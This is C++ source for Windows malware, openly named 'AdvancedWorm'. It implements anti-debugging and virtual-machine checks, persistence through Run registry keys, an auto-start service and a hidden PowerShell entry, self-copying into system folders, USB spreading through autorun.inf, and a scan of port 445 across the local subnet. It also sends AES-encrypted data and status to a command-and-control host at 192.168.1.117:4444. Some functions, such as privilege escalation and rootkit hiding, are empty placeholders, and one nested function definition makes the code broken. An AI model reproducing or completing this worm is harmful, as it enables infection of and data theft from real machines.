#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <shlwapi.h> // For PathFileExists
#include <userenv.h> // For DeleteProfile
#include <winioctl.h> // For DeviceIoControl
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Userenv.lib")

#define C2_SERVER_IP "192.168.1.117"
#define C2_SERVER_PORT 4444
#define ENCRYPTION_KEY "Ghostintheshell"

// Utility functions
void executeCommand(const std::string& command) {
    try {
        system(command.c_str());
    } catch (const std::exception& e) {
        std::cerr << "Error executing command: " << e.what() << std::endl;
    }
}

void scanNetwork(const std::string& subnet, int start, int end, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock." << std::endl;
        return;
    }

    try {
        std::vector<std::thread> threads;

        for (int i = start; i <= end; ++i) {
            std::string ip = subnet + std::to_string(i);

            threads.emplace_back([ip, port]() {
                SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (sock == INVALID_SOCKET) {
                    std::cerr << "Socket creation failed for " << ip << std::endl;
                    return;
                }

                sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);

                if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) <= 0) {
                    std::cerr << "Invalid address: " << ip << std::endl;
                    closesocket(sock);
                    return;
                }

                // Set a timeout for the connect call
                timeval timeout;
                timeout.tv_sec = 1; // 1 second
                timeout.tv_usec = 0;
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

                if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
                    std::cout << "Open port on " << ip << std::endl;
                }

                closesocket(sock);
            });
        }

        for (auto& t : threads) {
            t.join();
        }
    } catch (const std::exception& e) {
        std::cerr << "Error scanning network: " << e.what() << std::endl;
    }

    WSACleanup();
}

// Advanced Worm Class Definition
class AdvancedWorm {
public:
    AdvancedWorm(const std::string& c2_ip, int c2_port, const std::string& encryption_key)
        : c2_ip(c2_ip), c2_port(c2_port) {
        try {
            AES_set_encrypt_key(reinterpret_cast<const unsigned char*>(encryption_key.c_str()), 128, &encrypt_key);
            std::srand(static_cast<unsigned int>(std::time(nullptr)));
        } catch (const std::exception& e) {
            std::cerr << "Error initializing worm: " << e.what() << std::endl;
        }
    }

    void run() {
        try {
            if (checkDebugger() || checkVirtualMachine()) {
                std::cerr << "Debugger or Virtual Machine detected. Exiting." << std::endl;
                return;
            }

            establishPersistence();
            replicate();
            usbPropagation();
            scanNetwork("192.168.1.", 1, 254, 445); // Example network scanning
            escalatePrivileges();
            exfiltrateData();
            communicateWithC2();
            rootkitTechniques();
            cleanUpArtifacts();
        } catch (const std::exception& e) {
            std::cerr << "Error running worm: " << e.what() << std::endl;
        }
    }

protected:
    std::string c2_ip;
    int c2_port;
    AES_KEY encrypt_key;

    std::string encryptData(const std::string& data) {
        try {
            std::vector<unsigned char> encryptedData(data.size() + AES_BLOCK_SIZE);
            unsigned char iv[AES_BLOCK_SIZE];
            RAND_bytes(iv, AES_BLOCK_SIZE);

            AES_cbc_encrypt(reinterpret_cast<const unsigned char*>(data.c_str()), encryptedData.data(), data.size(), &encrypt_key, iv, AES_ENCRYPT);

            return std::string(encryptedData.begin(), encryptedData.end());
        } catch (const std::exception& e) {
            std::cerr << "Error encrypting data: " << e.what() << std::endl;
            return "";
        }
    }

    void sendDataToServer(const std::string& ipAddress, int port, const std::string& data) {
        WSADATA wsaData;
        SOCKET ConnectSocket = INVALID_SOCKET;
        sockaddr_in server_addr;

        try {
            // Initialize Winsock
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                std::cerr << "WSAStartup failed." << std::endl;
                return;
            }

            // Create a socket
            ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (ConnectSocket == INVALID_SOCKET) {
                std::cerr << "Socket creation failed." << std::endl;
                WSACleanup();
                return;
            }

            // Set up the sockaddr_in structure
            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons(port);

            // Convert IP address from string to binary form
            if (inet_pton(AF_INET, ipAddress.c_str(), &server_addr.sin_addr) <= 0) {
                std::cerr << "Invalid address: " << ipAddress << std::endl;
                closesocket(ConnectSocket);
                WSACleanup();
                return;
            }

            // Connect to the server
            if (connect(ConnectSocket, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
                std::cerr << "Failed to connect to server." << std::endl;
                closesocket(ConnectSocket);
                WSACleanup();
                return;
            }

            // Send data
            if (send(ConnectSocket, data.c_str(), static_cast<int>(data.size()), 0) == SOCKET_ERROR) {
                std::cerr << "Failed to send data." << std::endl;
            }

            // Clean up
            closesocket(ConnectSocket);
            WSACleanup();
        } catch (const std::exception& e) {
            std::cerr << "Error sending data to server: " << e.what() << std::endl;
            if (ConnectSocket != INVALID_SOCKET) {
                closesocket(ConnectSocket);
            }
            WSACleanup();
        }
    }
    void establishPersistence() {
        try {
            // Add to registry to run on startup
            HKEY hKey;
            if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                const std::string path = "C:\\path\\to\\advanced_worm.exe";
                RegSetValueEx(hKey, "AdvancedWorm", 0, REG_SZ, (const BYTE*)path.c_str(), path.size() + 1);
                RegCloseKey(hKey);
            }

            // Create a Windows service for enhanced persistence
            SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
            if (hSCManager) {
                SC_HANDLE hService = CreateService(
                    hSCManager,
                    "AdvancedWormService",
                    "AdvancedWormService",
                    SERVICE_ALL_ACCESS,
                    SERVICE_WIN32_OWN_PROCESS,
                    SERVICE_AUTO_START,
                    SERVICE_ERROR_NORMAL,
                    "C:\\path\\to\\advanced_worm.exe",
                    NULL,
                    NULL,
                    NULL,
                    NULL,
                    NULL
                );
                if (hService) {
                    StartService(hService, 0, NULL);
                    CloseServiceHandle(hService);
                }
                CloseServiceHandle(hSCManager);
            }

            // Fileless persistence using registry
            HKEY hKey2;
            if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey2) == ERROR_SUCCESS) {
                const std::string command = "powershell.exe -WindowStyle Hidden -Command \"[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('base64 encoded command'))\"";
                RegSetValueEx(hKey2, "AdvancedWormFileless", 0, REG_SZ, (const BYTE*)command.c_str(), command.size() + 1);
                RegCloseKey(hKey2);
            }
        } catch (const std::exception& e) {
            std::cerr << "Error establishing persistence: " << e.what() << std::endl;
        }
    }

    void replicate() {
        try {
            // Copy to common directories
            std::string filePath = "C:\\path\\to\\advanced_worm.exe";
            std::string destinations[] = {
                "C:\\Windows\\System32\\advanced_worm.exe",
                "C:\\Windows\\SysWOW64\\advanced_worm.exe",
                "C:\\Users\\Public\\advanced_worm.exe"
            };

            for (const std::string& dest : destinations) {
                if (CopyFile(filePath.c_str(), dest.c_str(), FALSE) == 0) {
                    std::cerr << "Failed to copy file to " << dest << std::endl;
                }
            }
        } catch (const std::exception& e) {
            std::cerr << "Error replicating worm: " << e.what() << std::endl;
        }
    }

    void usbPropagation() {
        try {void propagate_usb(const std::string &source_path) {
    char drive_letter = 'A';
    for (drive_letter = 'A'; drive_letter <= 'Z'; ++drive_letter) {
        std::string drive = std::string(1, drive_letter) + ":\\";
        if (GetDriveType(drive.c_str()) == DRIVE_REMOVABLE) {
            std::string target_path = drive + "AdvancedWorm.exe";
            CopyFile(source_path.c_str(), target_path.c_str(), FALSE);
            std::ofstream autorun_file(drive + "autorun.inf");
            autorun_file << "[autorun]\nopen=AdvancedWorm.exe\n";
            autorun_file.close();
        }
    }
}

        } catch (const std::exception& e) {
            std::cerr << "Error in USB propagation: " << e.what() << std::endl;
        }
    }

    void escalatePrivileges() {
        try {
            // Attempt to escalate privileges
            // Placeholder for privilege escalation technique
            // Implementation could involve creating scheduled tasks with elevated permissions
        } catch (const std::exception& e) {
            std::cerr << "Error escalating privileges: " << e.what() << std::endl;
        }
    }

    void exfiltrateData() {
        try {
            // Placeholder for data exfiltration
            // Implementation could involve reading files and sending their content to the C2 server
            std::string data = "Sample data to exfiltrate";
            std::string encryptedData = encryptData(data);

            sendDataToServer(c2_ip, c2_port, encryptedData);
        } catch (const std::exception& e) {
            std::cerr << "Error exfiltrating data: " << e.what() << std::endl;
        }
    }

    void communicateWithC2() {
        try {
            // Send status updates to C2 server
            std::string status = "Worm running";
            std::string encryptedStatus = encryptData(status);

            sendDataToServer(c2_ip, c2_port, encryptedStatus);
        } catch (const std::exception& e) {
            std::cerr << "Error communicating with C2 server: " << e.what() << std::endl;
        }
    }

    void rootkitTechniques() {
        try {
            // Placeholder for rootkit techniques
            // Implementation could involve hiding files and processes
            hideArtifacts();
        } catch (const std::exception& e) {
            std::cerr << "Error with rootkit techniques: " << e.what() << std::endl;
        }
    }

    void cleanUpArtifacts() {
        try {
            // Remove temporary files and scheduled tasks
            DeleteFile("C:\\path\\to\\temporary_file.tmp");
            executeCommand("schtasks /delete /tn \"AdvancedWormTask\" /f");
        } catch (const std::exception& e) {
            std::cerr << "Error cleaning up artifacts: " << e.what() << std::endl;
        }
    }

    bool checkDebugger() {
        return IsDebuggerPresent();
    }

    bool checkVirtualMachine() {
        bool isVM = false;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(pe);
            if (Process32First(hSnapshot, &pe)) {
                do {
                    if (strstr(pe.szExeFile, "vmware-vmx") || strstr(pe.szExeFile, "VBoxService")) {
                        isVM = true;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
        }
        return isVM;
    }

    void hideArtifacts() {
        try {
            // Placeholder for hiding artifacts
            // This might involve manipulating the file system or process visibility
        } catch (const std::exception& e) {
            std::cerr << "Error hiding artifacts: " << e.what() << std::endl;
        }
    }
};

int main() {
    try {
        AdvancedWorm worm(C2_SERVER_IP, C2_SERVER_PORT, ENCRYPTION_KEY);
        worm.run();
    } catch (const std::exception& e) {
        std::cerr << "Error in main: " << e.what() << std::endl;
    }

    return 0;
}